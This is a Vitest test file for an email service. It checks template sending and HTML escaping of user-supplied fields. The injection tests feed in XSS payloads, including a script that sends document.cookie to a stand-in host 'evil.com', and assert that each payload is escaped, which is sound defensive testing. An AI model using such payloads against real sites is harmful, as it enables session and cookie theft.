import { describe, it, expect, vi, beforeEach } from 'vitest';
import { EmailService, escapeHtml, escapeUrl } from './email.js';
import { interpolate } from './email-templates.js';

describe('EmailService', () => {
  let service: EmailService;

  beforeEach(() => {
    service = new EmailService('', 'test@example.org');
  });

  it('should be defined', () => {
    expect(service).toBeDefined();
  });

  describe('send (dev mode)', () => {
    it('should log email in dev mode instead of sending', async () => {
      const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
      await service.send({ to: 'test@example.com', subject: 'Test', html: '<p>Hello</p>' });
      expect(logSpy).toHaveBeenCalledWith(expect.stringContaining('test@example.com'));
      logSpy.mockRestore();
    });
  });

  describe('email templates', () => {
    it('should send magic link email', async () => {
      await expect(
        service.sendMagicLink('user@test.com', 'abc123', 'http://localhost:3000'),
      ).resolves.not.toThrow();
    });

    it('should send signup confirmation email', async () => {
      await expect(
        service.sendSignupConfirmation('user@test.com', 'John Doe', 'MEM-2026-00001'),
      ).resolves.not.toThrow();
    });

    it('should send weekly reminder email', async () => {
      await expect(
        service.sendWeeklyReminder('user@test.com', 'John Doe', 'MEM-2026-00001', '2026-01-01'),
      ).resolves.not.toThrow();
    });

    it('should send application approved email', async () => {
      await expect(
        service.sendApplicationApproved(
          'user@test.com',
          'John Doe',
          'MEM-2026-00001',
          'VOTING',
          'admin@test.com',
          new Date(),
        ),
      ).resolves.not.toThrow();
    });

    it('should send application rejected email', async () => {
      await expect(
        service.sendApplicationRejected(
          'user@test.com',
          'John Doe',
          'MEM-2026-00001',
          'Invalid docs',
          'admin@test.com',
          new Date(),
        ),
      ).resolves.not.toThrow();
    });
  });

  describe('HTML injection prevention', () => {
    it('escapeHtml encodes all five dangerous characters', () => {
      expect(escapeHtml('<script>alert("xss")</script>')).toBe(
        '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;',
      );
      expect(escapeHtml("O'Brien & Co")).toBe('O&#39;Brien &amp; Co');
    });

    it('escapeHtml handles null/undefined gracefully', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
    });

    it('escapeUrl allows http/https and encodes the result', () => {
      expect(escapeUrl('http://localhost:3000/verify?token=abc')).toBe(
        'http://localhost:3000/verify?token=abc',
      );
    });

    it('escapeUrl blocks javascript: scheme', () => {
      expect(escapeUrl('javascript:alert(1)')).toBe('#');
    });

    it('escapeUrl blocks data: scheme', () => {
      expect(escapeUrl('data:text/html,<h1>hi</h1>')).toBe('#');
    });

    it('sendSignupConfirmation escapes HTML in name and memberNumber', async () => {
      let capturedHtml = '';
      vi.spyOn(service, 'send').mockImplementationOnce(async (opts) => {
        capturedHtml = opts.html;
      });
      await service.sendSignupConfirmation(
        'user@test.com',
        '<img src=x onerror=alert(1)>',
        'MEM-<b>XSS</b>',
      );
      expect(capturedHtml).not.toContain('<img');
      expect(capturedHtml).not.toContain('<b>');
      expect(capturedHtml).toContain('&lt;img');
      expect(capturedHtml).toContain('MEM-&lt;b&gt;XSS&lt;/b&gt;');
    });

    it('sendApplicationRejected escapes reason (highest injection risk)', async () => {
      let capturedHtml = '';
      vi.spyOn(service, 'send').mockImplementationOnce(async (opts) => {
        capturedHtml = opts.html;
      });
      await service.sendApplicationRejected(
        'user@test.com',
        'Jane',
        'MEM-001',
        '</span><script>fetch("//evil.com?c="+document.cookie)</script>',
        'admin@test.com',
        new Date(),
      );
      expect(capturedHtml).not.toContain('<script>');
      expect(capturedHtml).toContain('&lt;/span&gt;');
      expect(capturedHtml).toContain('&lt;script&gt;');
    });

    it('sendApplicationApproved escapes approvedBy field', async () => {
      let capturedHtml = '';
      vi.spyOn(service, 'send').mockImplementationOnce(async (opts) => {
        capturedHtml = opts.html;
      });
      await service.sendApplicationApproved(
        'user@test.com',
        'Jane',
        'MEM-001',
        'VOTING',
        '<a href="evil.com">Admin</a>',
        new Date(),
      );
      expect(capturedHtml).not.toContain('<a href="evil.com"');
      expect(capturedHtml).toContain('&lt;a href=&quot;evil.com&quot;&gt;');
    });
  });

  describe('interpolate() HTML escaping', () => {
    it('escapes injected values in template strings', () => {
      const result = interpolate('Hello {{name}}!', {
        name: '<script>alert(1)</script>',
      });
      expect(result).toBe('Hello &lt;script&gt;alert(1)&lt;/script&gt;!');
    });

    it('leaves unknown placeholders intact', () => {
      expect(interpolate('Hi {{name}} ref {{memberNumber}}', { name: 'Alice' })).toBe(
        'Hi Alice ref {{memberNumber}}',
      );
    });
  });
});
